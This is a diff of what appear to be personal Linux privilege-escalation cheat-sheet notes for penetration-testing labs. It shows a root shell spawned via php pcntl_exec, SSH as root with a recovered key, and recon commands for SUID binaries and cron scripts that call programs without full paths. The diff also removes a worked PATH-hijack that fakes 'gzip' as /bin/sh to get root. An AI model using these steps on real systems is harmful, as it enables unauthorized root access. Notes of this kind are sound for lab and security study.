@@ -57,21 +57,18 @@ php7.2 -r "pcntl exec('/bin/sh', ['-p']);"
 vim id_rsa; chmod 600 id_rsa; ssh root@192.168.200.5 -i id_rsa 
 
 =================================== 
-Path Inject
+Watch for Injections for Rootbash
 
-Sudo/App/Call that doesnt use full-path
-gzip -c /var/log/xyz
-strings /usr/bin/menu
-ltrace /bin/sysinfo
+SUID, Crons, Services, Etc that doesnt use full-path
+cat /home/user/overwrite.sh 
+cat ./zabbix-service  ..calls 'systemctl'
+cat /usr/bin/pyscript.py
+/usr/bin/kick runs 'service apache2 start' ..w/o fullpath
+strings /usr/bin/kick  ..found 'service apache2 start' 
+strace -v -f -e execve /usr/bin/kick 2>&1 | grep service 
+echo $PATH
 
-cd /tmp 
-echo /bin/sh > gzip
-chmod 777 gzip
-echo $PATH 
-export PATH=/tmp:$PATH
-/usr/bin/menu
-whoami
-root
+REF mxrootbash
 
 =================================== 
 alias ll='ls -lsaht --color=auto'
